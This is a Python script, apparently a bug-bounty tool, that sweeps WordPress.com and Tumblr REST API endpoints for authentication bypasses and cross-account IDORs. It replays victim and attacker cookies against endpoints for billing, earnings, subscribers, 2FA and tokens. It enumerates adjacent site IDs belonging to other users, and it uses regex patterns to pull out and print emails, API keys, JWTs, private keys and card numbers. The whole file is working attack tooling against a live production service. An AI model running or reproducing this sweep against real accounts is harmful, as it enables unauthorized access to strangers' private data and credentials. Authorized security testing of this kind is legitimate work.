#!/usr/bin/env python3
"""
wpcom-sweep.py — WordPress.com / Automattic REST API Auth-Bypass Sweeper
by Daema 🖤 (4AM Build, Feb 24 2026)

Tests WordPress.com REST API endpoints (/rest/v1.1/ + /wp/v2/ + /wpcom/v2/)
for authentication bypass, cross-account IDOR, and unauthenticated PII exposure.

Zero external dependencies — pure Python 3 stdlib.

Usage:
  # Basic: test as unauthenticated only
  python3 wpcom-sweep.py --site-id 123456789

  # Full IDOR: victim cookie vs attacker cookie
  python3 wpcom-sweep.py --site-id 123456789 \\
      --victim-cookie "$(cat ~/targets/Automattic/config/victim-cookies.txt)" \\
      --attacker-cookie "$(cat ~/targets/Automattic/config/attacker-cookies.txt)" \\
      --attacker-blog "mhndfi-hc"

  # Just scan a Tumblr blog
  python3 wpcom-sweep.py --tumblr-blog "targetblog" \\
      --victim-cookie "..." --attacker-cookie "..."

  # Full report with HTML output
  python3 wpcom-sweep.py --site-id 123456789 \\
      --victim-cookie "..." --attacker-cookie "..." \\
      --output-html poc-wpcom.html --verbose

  # Enumerate site IDs around a known one (IDOR sweep)
  python3 wpcom-sweep.py --site-id 123456789 --enum-range 10 --verbose

Hunting Notes:
  - site_id is numeric; get yours from: https://wordpress.com/wp-json/wp/v2/sites
  - Or visit: https://public-api.wordpress.com/rest/v1.1/sites/<yourblog.wordpress.com>
  - Tumblr blogs also have WordPress.com site IDs (Automattic infrastructure)
  - Key IDOR targets: wordads/earnings, billing-history, settings, subscribers
  - WordAds earnings = REVENUE DATA — always HIGH severity if exposed
"""

import sys
import json
import time
import http.client
import urllib.parse
import urllib.request
import argparse
import re
import datetime
import os
from typing import Optional

# ─── Version ───────────────────────────────────────────────────────────────────
VERSION = "1.0.0"
AUTHOR  = "Daema (4AM Build 2026-02-24)"

# ─── Targets ───────────────────────────────────────────────────────────────────
WPCOM_API  = "public-api.wordpress.com"
TUMBLR_API = "api.tumblr.com"

# ─── PII Detection Patterns ────────────────────────────────────────────────────
PII_PATTERNS = {
    "email":        r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}',
    "phone":        r'\b\+?[\d\s\-\(\)]{10,15}\b',
    "ip_address":   r'\b(?:\d{1,3}\.){3}\d{1,3}\b',
    "jwt":          r'eyJ[A-Za-z0-9\-_=]+\.eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=+/]+',
    "api_key":      r'(?:api[_\-]?key|access[_\-]?token|secret)["\s:=]+[A-Za-z0-9\-_]{16,}',
    "credit_card":  r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b',
    "oauth_token":  r'"oauth_token"\s*:\s*"[^"]+"',
    "wordpress_nonce": r'"nonce"\s*:\s*"[a-f0-9]{10,}"',
    "birth_date":   r'"birth_date"\s*:\s*"[^"]+"',
    "revenue":      r'"total_earnings"\s*:\s*[\d.]+|"paid_to_date"\s*:\s*[\d.]+',
    "private_key":  r'-----BEGIN (?:RSA )?PRIVATE KEY-----',
    "aws_key":      r'AKIA[0-9A-Z]{16}',
}

# High-value field names that indicate sensitive data in JSON responses
SENSITIVE_KEYS = {
    "email", "billing_email", "user_email",
    "birth_date", "phone", "phone_number",
    "total_earnings", "paid_to_date", "balance",
    "oauth_token", "access_token", "secret",
    "two_step_enabled", "two_step_type",
    "credit_card", "payment_method",
    "password", "current_password",
    "ip", "ip_address", "last_ip",
    "primary_blog_url", "primary_blog",
    "connected_applications",
    "nonce", "wpnonce",
}

# ─── Endpoint Definitions ──────────────────────────────────────────────────────
# Format: (method, path_template, auth_required, severity, description, namespace)
# path_template vars: {site_id}, {blog}, {user_id}, {post_id}

ENDPOINTS = [
    # ──── /me endpoints (HIGH value — should ALWAYS require auth) ────
    ("GET", "/rest/v1.1/me",                              True,  "HIGH",   "Current user profile (email, name, URL)",           "rest/v1.1"),
    ("GET", "/rest/v1.1/me/settings",                     True,  "HIGH",   "User settings (email, 2FA, language)",              "rest/v1.1"),
    ("GET", "/rest/v1.1/me/billing-history",              True,  "CRIT",   "Billing history — payment records! 💰",             "rest/v1.1"),
    ("GET", "/rest/v1.1/me/connected-applications",       True,  "HIGH",   "OAuth apps connected to account",                   "rest/v1.1"),
    ("GET", "/rest/v1.1/me/two-step",                     True,  "HIGH",   "2FA configuration",                                 "rest/v1.1"),
    ("GET", "/rest/v1.1/me/likes",                        True,  "MED",    "Liked posts (activity fingerprinting)",             "rest/v1.1"),
    ("GET", "/rest/v1.1/me/posts",                        True,  "MED",    "All user posts across sites",                       "rest/v1.1"),
    ("GET", "/rest/v1.1/me/sites",                        True,  "HIGH",   "All sites owned — reveals hidden blogs",            "rest/v1.1"),
    ("GET", "/rest/v1.1/me/sites/features",               True,  "LOW",    "Site features list",                                "rest/v1.1"),
    ("GET", "/rest/v1.1/me/preferences",                  True,  "MED",    "User preferences",                                  "rest/v1.1"),
    ("GET", "/rest/v1.1/me/settings/profile-links",       True,  "LOW",    "Profile links",                                     "rest/v1.1"),

    # ──── /sites/{site_id} endpoints ────
    ("GET", "/rest/v1.1/sites/{site_id}",                 False, "INFO",   "Site metadata (public, but check fields)",          "rest/v1.1"),
    ("GET", "/rest/v1.1/sites/{site_id}/settings",        True,  "HIGH",   "Site settings — admin email, config 🎯",            "rest/v1.1"),
    ("GET", "/rest/v1.1/sites/{site_id}/users",           False, "MED",    "Site users list (email + role exposure)",           "rest/v1.1"),
    ("GET", "/rest/v1.1/sites/{site_id}/posts?status=draft", True, "HIGH", "Draft/private posts — unpublished content",        "rest/v1.1"),
    ("GET", "/rest/v1.1/sites/{site_id}/posts?status=private", True, "HIGH", "Private posts",                                  "rest/v1.1"),
    ("GET", "/rest/v1.1/sites/{site_id}/post-counts/post",False, "LOW",    "Post counts by status",                            "rest/v1.1"),

    # ──── WordAds (revenue — very sensitive) ────
    ("GET", "/rest/v1.1/sites/{site_id}/wordads/earnings",True,  "CRIT",   "WordAds earnings — revenue data! 💰💰",            "rest/v1.1"),
    ("GET", "/rest/v1.1/sites/{site_id}/wordads/settings",True,  "HIGH",   "WordAds settings — ad config + payment info",      "rest/v1.1"),
    ("GET", "/rest/v1.1/sites/{site_id}/wordads/stats",   True,  "HIGH",   "WordAds stats",                                    "rest/v1.1"),
    ("GET", "/rest/v1.1/sites/{site_id}/wordads/tos",     True,  "LOW",    "WordAds TOS agreement status",                     "rest/v1.1"),

    # ──── Subscriptions ────
    ("GET", "/rest/v1.1/sites/{site_id}/subscribers",     True,  "HIGH",   "Site subscribers list (emails!)",                  "rest/v1.1"),
    ("GET", "/rest/v1.1/sites/{site_id}/email-followers", True,  "HIGH",   "Email followers (PII — names + emails)",           "rest/v1.1"),

    # ──── WordPress REST API (/wp/v2/) ────
    ("GET", "/wp/v2/sites/{site_id}/users",               True,  "MED",    "WP users via wp/v2 namespace",                     "wp/v2"),
    ("GET", "/wp/v2/users?per_page=100",                  False, "MED",    "User enumeration via WP REST API",                 "wp/v2"),

    # ──── Tumblr v2 API ────
    ("GET", "/v2/user/info",                              True,  "HIGH",   "Tumblr user info (name, blogs, likes count)",       "tumblr/v2"),
    ("GET", "/v2/user/following",                         True,  "MED",    "Who victim follows",                                "tumblr/v2"),
    ("GET", "/v2/user/likes",                             True,  "MED",    "Victim's liked posts",                             "tumblr/v2"),
    ("GET", "/v2/blog/{blog}/info",                       False, "INFO",   "Blog info (public)",                               "tumblr/v2"),
    ("GET", "/v2/blog/{blog}/posts/draft",                True,  "HIGH",   "Draft posts — unpublished content",                "tumblr/v2"),
    ("GET", "/v2/blog/{blog}/posts/submission",           True,  "HIGH",   "Submitted posts",                                  "tumblr/v2"),
    ("GET", "/v2/blog/{blog}/posts/queue",                True,  "HIGH",   "Queued posts — upcoming content",                  "tumblr/v2"),
    ("GET", "/v2/blog/{blog}/followers",                  True,  "HIGH",   "Blog followers list (usernames!)",                 "tumblr/v2"),
    ("GET", "/v2/blog/{blog}/notifications",              True,  "HIGH",   "Blog notifications (activity)",                    "tumblr/v2"),
    ("GET", "/v2/blog/{blog}/blocks",                     True,  "MED",    "Blocked users list",                               "tumblr/v2"),
    ("GET", "/v2/user/birth_date",                        True,  "CRIT",   "Birth date — PII! 🎂",                             "tumblr/v2"),
    ("GET", "/v2/user/settings",                          True,  "HIGH",   "Tumblr account settings",                         "tumblr/v2"),
    ("GET", "/v2/tauth/details",                          True,  "CRIT",   "Auth token details",                               "tumblr/v2"),
]

# ─── Colors ────────────────────────────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    YELLOW = "\033[93m"
    GREEN  = "\033[92m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    PURPLE = "\033[95m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

SEV_COLOR = {
    "CRIT": C.RED + C.BOLD,
    "HIGH": C.RED,
    "MED":  C.YELLOW,
    "LOW":  C.CYAN,
    "INFO": C.DIM,
}

# ─── HTTP Helper ───────────────────────────────────────────────────────────────
def http_get(host: str, path: str, cookies: str = "", extra_headers: dict = {},
             timeout: int = 10) -> tuple[int, str, dict]:
    """Simple HTTPS GET with optional cookie injection. Returns (status, body, headers)."""
    try:
        conn = http.client.HTTPSConnection(host, timeout=timeout)
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",
        }
        if cookies:
            headers["Cookie"] = cookies
        headers.update(extra_headers)

        conn.request("GET", path, headers=headers)
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", errors="replace")
        resp_headers = dict(resp.getheaders())
        conn.close()
        return resp.status, body, resp_headers
    except Exception as e:
        return 0, f"[ERROR: {e}]", {}


# ─── Analysis ──────────────────────────────────────────────────────────────────
def detect_pii(body: str) -> list[tuple[str, str]]:
    """Find PII/sensitive data in response body. Returns [(type, match), ...]"""
    findings = []
    for pii_type, pattern in PII_PATTERNS.items():
        matches = re.findall(pattern, body, re.IGNORECASE)
        for m in matches[:3]:  # max 3 examples per type
            findings.append((pii_type, str(m)[:80]))
    return findings

def detect_sensitive_keys(body: str) -> list[str]:
    """Find sensitive JSON keys in response body."""
    found = []
    try:
        data = json.loads(body)
        def walk(obj, depth=0):
            if depth > 10:
                return
            if isinstance(obj, dict):
                for k, v in obj.items():
                    if k.lower() in SENSITIVE_KEYS and v not in (None, "", [], {}):
                        found.append(f"{k}={repr(v)[:60]}")
                    walk(v, depth + 1)
            elif isinstance(obj, list):
                for item in obj[:5]:
                    walk(item, depth + 1)
        walk(data)
    except Exception:
        pass
    return found

def classify_result(status_unauth: int, status_victim: int, status_attacker: int,
                    body_unauth: str, body_victim: str, body_attacker: str,
                    endpoint_auth_required: bool) -> str:
    """
    Classify the finding type:
    - BYPASS_UNAUTH: Sensitive endpoint responds 200 without any auth
    - IDOR_CONFIRMED: Attacker cookie can access victim's data
    - IDOR_POSSIBLE: Attacker gets different response than expected
    - PROTECTED: Properly protected
    - INTERESTING: Partial auth bypass or info leak
    """
    # Check for auth bypass (unauthenticated access to protected endpoint)
    if endpoint_auth_required and status_unauth == 200 and len(body_unauth) > 50:
        if '"error"' not in body_unauth.lower() and '"unauthorized"' not in body_unauth.lower():
            return "BYPASS_UNAUTH"

    # Check IDOR (attacker cookie gets victim data)
    if status_victim == 200 and status_attacker == 200:
        # If bodies differ but BOTH succeed, might be normal (each user sees their own)
        # If bodies are similar (same user data returned), it's IDOR
        if len(body_victim) > 100 and len(body_attacker) > 100:
            victim_json = {}
            attacker_json = {}
            try:
                victim_json = json.loads(body_victim)
                attacker_json = json.loads(body_attacker)
            except Exception:
                pass
            # Check if attacker response contains victim-specific data patterns
            # Basic heuristic: if victim body != attacker body significantly
            similarity = abs(len(body_victim) - len(body_attacker)) / max(len(body_victim), 1)
            if similarity < 0.1 and body_victim != body_attacker:
                return "IDOR_POSSIBLE"
            if body_victim == body_attacker:
                return "IDOR_CONFIRMED"

    # Error responses suggesting auth is checked
    if status_victim == 200 and status_attacker in (401, 403, 404):
        return "PROTECTED"

    if status_unauth in (401, 403):
        if status_victim == 200:
            return "PROTECTED"

    if status_unauth == 200 and not endpoint_auth_required:
        return "PUBLIC"

    if status_unauth in (200,) and endpoint_auth_required:
        return "INTERESTING"

    return "PROTECTED"


# ─── Scanner ───────────────────────────────────────────────────────────────────
class WPComSweeper:
    def __init__(self, args):
        self.site_id      = args.site_id
        self.blog         = args.tumblr_blog or args.site_id
        self.victim_cookie  = args.victim_cookie or ""
        self.attacker_cookie = args.attacker_cookie or ""
        self.verbose      = args.verbose
        self.delay        = args.delay
        self.output_html  = args.output_html
        self.enum_range   = args.enum_range
        self.results      = []
        self.start_time   = datetime.datetime.now()

    def log(self, msg: str, color: str = ""):
        print(f"{color}{msg}{C.RESET}" if color else msg)

    def test_endpoint(self, method: str, path_template: str, auth_required: bool,
                      severity: str, description: str, namespace: str,
                      site_id: str = None) -> dict:
        """Run a single endpoint test with all auth levels."""
        site = site_id or self.site_id or ""
        blog = self.blog or ""

        path = path_template.replace("{site_id}", str(site)).replace("{blog}", str(blog))

        # Pick host based on namespace
        if namespace.startswith("tumblr"):
            host = TUMBLR_API
        else:
            host = WPCOM_API

        if self.verbose:
            self.log(f"  → Testing {method} {path}", C.DIM)

        # 1. Unauthenticated request
        s_unauth, b_unauth, h_unauth = http_get(host, path)
        time.sleep(self.delay)

        # 2. Victim cookie (if provided)
        s_victim, b_victim, h_victim = (0, "", {})
        if self.victim_cookie:
            s_victim, b_victim, h_victim = http_get(host, path, cookies=self.victim_cookie)
            time.sleep(self.delay)

        # 3. Attacker cookie to victim's path (IDOR test)
        s_attacker, b_attacker, h_attacker = (0, "", {})
        if self.attacker_cookie:
            s_attacker, b_attacker, h_attacker = http_get(host, path, cookies=self.attacker_cookie)
            time.sleep(self.delay)

        # Analyze
        pii_unauth   = detect_pii(b_unauth) if s_unauth == 200 else []
        pii_attacker = detect_pii(b_attacker) if s_attacker == 200 else []
        keys_unauth  = detect_sensitive_keys(b_unauth) if s_unauth == 200 else []
        keys_attacker = detect_sensitive_keys(b_attacker) if s_attacker == 200 else []

        classification = classify_result(
            s_unauth, s_victim, s_attacker,
            b_unauth, b_victim, b_attacker,
            auth_required
        )

        result = {
            "method":         method,
            "path":           path,
            "host":           host,
            "namespace":      namespace,
            "description":    description,
            "severity":       severity,
            "auth_required":  auth_required,
            "classification": classification,
            "status_unauth":  s_unauth,
            "status_victim":  s_victim,
            "status_attacker": s_attacker,
            "body_unauth":    b_unauth[:2000],
            "body_attacker":  b_attacker[:2000],
            "pii_unauth":     pii_unauth,
            "pii_attacker":   pii_attacker,
            "keys_unauth":    keys_unauth[:10],
            "keys_attacker":  keys_attacker[:10],
            "interesting":    classification in ("BYPASS_UNAUTH", "IDOR_CONFIRMED", "IDOR_POSSIBLE", "INTERESTING"),
        }
        return result

    def print_result(self, r: dict):
        """Print a result line to stdout."""
        c = classify_color(r["classification"])
        sev_c = SEV_COLOR.get(r["severity"], "")
        status_str = f"{r['status_unauth']}"
        if r["status_victim"]:
            status_str += f"/{r['status_victim']}"
        if r["status_attacker"]:
            status_str += f"/{r['status_attacker']}"

        marker = "🎯" if r["interesting"] else "  "
        print(f"{marker} {c}[{r['classification']:14s}]{C.RESET} "
              f"{sev_c}[{r['severity']:4s}]{C.RESET} "
              f"[{status_str}] "
              f"{r['path'][:60]:<60} "
              f"{C.DIM}{r['description'][:50]}{C.RESET}")

        if r["interesting"]:
            if r["pii_unauth"]:
                print(f"       {C.RED}PII (unauth): {r['pii_unauth'][:3]}{C.RESET}")
            if r["pii_attacker"]:
                print(f"       {C.RED}PII (attacker): {r['pii_attacker'][:3]}{C.RESET}")
            if r["keys_unauth"]:
                print(f"       {C.YELLOW}Sensitive keys (unauth): {r['keys_unauth'][:3]}{C.RESET}")
            if r["keys_attacker"]:
                print(f"       {C.YELLOW}Sensitive keys (attacker): {r['keys_attacker'][:3]}{C.RESET}")
            if self.verbose and r["status_unauth"] == 200:
                snippet = r["body_unauth"][:300].replace("\n", " ")
                print(f"       {C.DIM}BODY: {snippet}{C.RESET}")

    def run(self):
        """Main scan loop."""
        self.log(f"\n{C.BOLD}{C.PURPLE}╔══════════════════════════════════════════════════════════╗{C.RESET}")
        self.log(f"{C.BOLD}{C.PURPLE}║  wpcom-sweep.py v{VERSION} — by {AUTHOR}  ║{C.RESET}")
        self.log(f"{C.BOLD}{C.PURPLE}╚══════════════════════════════════════════════════════════╝{C.RESET}\n")

        if self.site_id:
            self.log(f"  Target site_id : {C.CYAN}{self.site_id}{C.RESET}")
        if self.blog:
            self.log(f"  Target blog    : {C.CYAN}{self.blog}{C.RESET}")
        self.log(f"  Victim cookie  : {C.GREEN}{'✓ set' if self.victim_cookie else '✗ not set'}{C.RESET}")
        self.log(f"  Attacker cookie: {C.GREEN}{'✓ set' if self.attacker_cookie else '✗ not set'}{C.RESET}")
        self.log(f"  Endpoints      : {len(ENDPOINTS)}")
        self.log(f"  Delay          : {self.delay}s between requests\n")

        if not self.site_id and not self.blog:
            self.log(f"{C.RED}[!] No target specified. Use --site-id or --tumblr-blog{C.RESET}")
            sys.exit(1)

        # Filter endpoints based on what's configured
        endpoints_to_test = []
        for ep in ENDPOINTS:
            method, path, auth_req, sev, desc, ns = ep
            skip = False
            if "{site_id}" in path and not self.site_id:
                skip = True
            if "{blog}" in path and not self.blog:
                skip = True
            if ns.startswith("tumblr") and not (self.blog or self.site_id):
                skip = True
            if not skip:
                endpoints_to_test.append(ep)

        self.log(f"{C.BOLD}{'─'*90}{C.RESET}")
        self.log(f"{'CLASSIFICATION':17s} {'SEV':6s} {'STATUS':12s} {'PATH':60s} {'DESC'}")
        self.log(f"{'─'*90}{C.RESET}")

        for ep in endpoints_to_test:
            method, path, auth_req, sev, desc, ns = ep
            result = self.test_endpoint(method, path, auth_req, sev, desc, ns)
            self.results.append(result)
            self.print_result(result)

        # IDOR enumeration sweep (try adjacent site IDs)
        if self.enum_range and self.site_id:
            self.log(f"\n{C.BOLD}[*] IDOR Sweep: Testing {self.enum_range * 2} adjacent site IDs...{C.RESET}")
            base = int(self.site_id)
            sensitive_ep = ("/rest/v1.1/sites/{site_id}/settings", True, "HIGH", "Site settings", "rest/v1.1")
            for delta in range(-self.enum_range, self.enum_range + 1):
                if delta == 0:
                    continue
                test_id = str(base + delta)
                r = self.test_endpoint("GET", sensitive_ep[0], sensitive_ep[1],
                                        sensitive_ep[2], f"IDOR sweep delta={delta:+d}",
                                        sensitive_ep[4], site_id=test_id)
                if r["interesting"] or r["status_unauth"] == 200:
                    self.results.append(r)
                    self.print_result(r)
                else:
                    if self.verbose:
                        self.log(f"  [{test_id}] {r['status_unauth']} — skip", C.DIM)

        # Summary
        self.print_summary()

        # HTML report
        if self.output_html:
            self.generate_html_report()

    def print_summary(self):
        interesting = [r for r in self.results if r["interesting"]]
        bypasses    = [r for r in self.results if r["classification"] == "BYPASS_UNAUTH"]
        idors       = [r for r in self.results if r["classification"] in ("IDOR_CONFIRMED", "IDOR_POSSIBLE")]
        crits       = [r for r in interesting if r["severity"] == "CRIT"]
        highs       = [r for r in interesting if r["severity"] == "HIGH"]

        elapsed = (datetime.datetime.now() - self.start_time).seconds
        self.log(f"\n{'─'*90}")
        self.log(f"\n{C.BOLD}SCAN SUMMARY — {elapsed}s elapsed{C.RESET}")
        self.log(f"  Endpoints tested : {len(self.results)}")
        self.log(f"  {C.RED + C.BOLD}Auth bypasses    : {len(bypasses)}{C.RESET}")
        self.log(f"  {C.RED}IDOR findings    : {len(idors)}{C.RESET}")
        self.log(f"  {C.RED + C.BOLD}CRITICAL         : {len(crits)}{C.RESET}")
        self.log(f"  {C.RED}HIGH             : {len(highs)}{C.RESET}")

        if interesting:
            self.log(f"\n{C.BOLD}🎯 INTERESTING FINDINGS:{C.RESET}")
            for r in interesting:
                c = classify_color(r["classification"])
                self.log(f"  {c}[{r['classification']}]{C.RESET} {r['severity']:4s} "
                         f"https://{r['host']}{r['path']}")
                if r["pii_unauth"] or r["pii_attacker"]:
                    self.log(f"    → PII DETECTED!", C.RED)
                if r["keys_unauth"] or r["keys_attacker"]:
                    self.log(f"    → Sensitive keys: {(r['keys_unauth'] + r['keys_attacker'])[:3]}", C.YELLOW)

    def generate_html_report(self):
        """Generate a dark-mode HTML report suitable for HackerOne PoC screenshots."""
        interesting = [r for r in self.results if r["interesting"]]
        all_results = self.results

        rows = ""
        for r in all_results:
            sev_classes = {"CRIT": "sev-crit", "HIGH": "sev-high", "MED": "sev-med",
                           "LOW": "sev-low", "INFO": "sev-info"}
            cls_classes = {"BYPASS_UNAUTH": "cls-bypass", "IDOR_CONFIRMED": "cls-idor",
                           "IDOR_POSSIBLE": "cls-idor", "PROTECTED": "cls-ok",
                           "PUBLIC": "cls-pub", "INTERESTING": "cls-int"}
            sev_cls = sev_classes.get(r["severity"], "")
            cls_cls = cls_classes.get(r["classification"], "")

            pii_html = ""
            all_pii = r["pii_unauth"] + r["pii_attacker"]
            if all_pii:
                pii_html = "<br>🔴 <b>PII:</b> " + ", ".join(
                    f"<code>{t}:{v[:30]}</code>" for t, v in all_pii[:3])
            keys_html = ""
            all_keys = r["keys_unauth"] + r["keys_attacker"]
            if all_keys:
                keys_html = "<br>🟡 <b>Keys:</b> " + ", ".join(
                    f"<code>{k[:50]}</code>" for k in all_keys[:3])

            body_html = ""
            if r["interesting"] and r.get("body_unauth"):
                snippet = r["body_unauth"][:500].replace("<", "&lt;").replace(">", "&gt;")
                body_html = f'<details><summary>Response preview</summary><pre class="resp">{snippet}</pre></details>'

            rows += f"""
            <tr class="{'highlight' if r['interesting'] else ''}">
              <td><span class="{cls_cls}">{r['classification']}</span></td>
              <td><span class="{sev_cls}">{r['severity']}</span></td>
              <td>{r['status_unauth']} / {r['status_victim'] or '-'} / {r['status_attacker'] or '-'}</td>
              <td><a href="https://{r['host']}{r['path']}" target="_blank">{r['path'][:70]}</a></td>
              <td>{r['description'][:60]}{pii_html}{keys_html}{body_html}</td>
            </tr>"""

        html = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>wpcom-sweep — {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}</title>
  <style>
    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
    body {{ background: #0d1117; color: #c9d1d9; font-family: 'Consolas', monospace; font-size: 13px; padding: 20px; }}
    h1 {{ color: #58a6ff; margin-bottom: 5px; }}
    h2 {{ color: #8b949e; font-size: 14px; margin-bottom: 20px; }}
    .meta {{ background: #161b22; padding: 15px; border-radius: 6px; margin-bottom: 20px; border: 1px solid #30363d; }}
    .meta span {{ color: #58a6ff; }}
    table {{ width: 100%; border-collapse: collapse; }}
    th {{ background: #161b22; color: #8b949e; padding: 8px; text-align: left; border-bottom: 2px solid #30363d; }}
    td {{ padding: 6px 8px; border-bottom: 1px solid #21262d; vertical-align: top; }}
    tr.highlight {{ background: #1a1f2a; }}
    tr:hover {{ background: #1c2128; }}
    a {{ color: #58a6ff; text-decoration: none; word-break: break-all; }}
    a:hover {{ text-decoration: underline; }}
    pre.resp {{ background: #0d1117; color: #7ee787; padding: 10px; border-radius: 4px; margin-top: 8px; white-space: pre-wrap; font-size: 11px; max-height: 200px; overflow-y: auto; }}
    code {{ background: #161b22; padding: 2px 4px; border-radius: 3px; color: #ffa657; font-size: 11px; }}
    details summary {{ cursor: pointer; color: #8b949e; font-size: 11px; }}
    .sev-crit {{ color: #ff0000; font-weight: bold; }}
    .sev-high {{ color: #f85149; }}
    .sev-med  {{ color: #d29922; }}
    .sev-low  {{ color: #58a6ff; }}
    .sev-info {{ color: #8b949e; }}
    .cls-bypass {{ color: #ff0000; font-weight: bold; }}
    .cls-idor   {{ color: #f85149; font-weight: bold; }}
    .cls-int    {{ color: #d29922; }}
    .cls-ok     {{ color: #3fb950; }}
    .cls-pub    {{ color: #8b949e; }}
    .summary {{ background: #161b22; padding: 15px; border-radius: 6px; margin-bottom: 20px; border: 1px solid #30363d; }}
    .summary .label {{ color: #8b949e; }}
    .summary .val-bad {{ color: #f85149; font-weight: bold; }}
    .summary .val-ok  {{ color: #3fb950; }}
  </style>
</head>
<body>
  <h1>🔍 wpcom-sweep — WordPress.com / Automattic REST API Sweep</h1>
  <h2>by Daema 🖤 | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}</h2>

  <div class="meta">
    <b>Target site_id:</b> <span>{self.site_id or 'n/a'}</span> &nbsp;|&nbsp;
    <b>Blog:</b> <span>{self.blog or 'n/a'}</span> &nbsp;|&nbsp;
    <b>Victim auth:</b> <span>{'✓' if self.victim_cookie else '✗'}</span> &nbsp;|&nbsp;
    <b>Attacker auth:</b> <span>{'✓' if self.attacker_cookie else '✗'}</span> &nbsp;|&nbsp;
    <b>Endpoints:</b> <span>{len(self.results)}</span>
  </div>

  <div class="summary">
    <b>Results:</b> &nbsp;
    <span class="label">Auth Bypasses: </span><span class="val-bad">{len([r for r in all_results if r['classification']=='BYPASS_UNAUTH'])}</span> &nbsp;|&nbsp;
    <span class="label">IDORs: </span><span class="val-bad">{len([r for r in all_results if r['classification'] in ('IDOR_CONFIRMED','IDOR_POSSIBLE')])}</span> &nbsp;|&nbsp;
    <span class="label">Interesting: </span><span class="val-bad">{len(interesting)}</span> &nbsp;|&nbsp;
    <span class="label">Protected: </span><span class="val-ok">{len([r for r in all_results if r['classification']=='PROTECTED'])}</span>
  </div>

  <table>
    <tr>
      <th>Classification</th>
      <th>Severity</th>
      <th>Status (unauth/victim/attacker)</th>
      <th>Path</th>
      <th>Details</th>
    </tr>
    {rows}
  </table>

  <p style="margin-top:20px; color:#8b949e; font-size:11px;">
    Generated by wpcom-sweep.py v{VERSION} — github.com/MhndFi/MyTools
  </p>
</body>
</html>"""

        with open(self.output_html, "w") as f:
            f.write(html)
        print(f"\n{C.GREEN}[✓] HTML report saved: {self.output_html}{C.RESET}")


def classify_color(classification: str) -> str:
    return {
        "BYPASS_UNAUTH": C.RED + C.BOLD,
        "IDOR_CONFIRMED": C.RED + C.BOLD,
        "IDOR_POSSIBLE": C.RED,
        "INTERESTING": C.YELLOW,
        "PROTECTED": C.GREEN,
        "PUBLIC": C.DIM,
    }.get(classification, "")


# ─── CLI ───────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="wpcom-sweep.py — WordPress.com/Automattic REST API auth-bypass sweeper",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    parser.add_argument("--site-id",       help="WordPress.com numeric site ID")
    parser.add_argument("--tumblr-blog",   help="Tumblr blog identifier (e.g. 'mhndfi-hc')")
    parser.add_argument("--victim-cookie", help="Cookie header string for victim account")
    parser.add_argument("--attacker-cookie", help="Cookie header string for attacker account (IDOR test)")
    parser.add_argument("--attacker-blog", help="Attacker's own blog name (for perspective)")
    parser.add_argument("--delay",         type=float, default=0.3, help="Delay between requests in seconds (default: 0.3)")
    parser.add_argument("--output-html",   help="Save HTML report to this file")
    parser.add_argument("--enum-range",    type=int, default=0, help="Enumerate N adjacent site IDs for IDOR sweep (default: 0)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    parser.add_argument("--version",       action="version", version=f"wpcom-sweep {VERSION}")

    args = parser.parse_args()

    sweeper = WPComSweeper(args)
    sweeper.run()


if __name__ == "__main__":
    main()
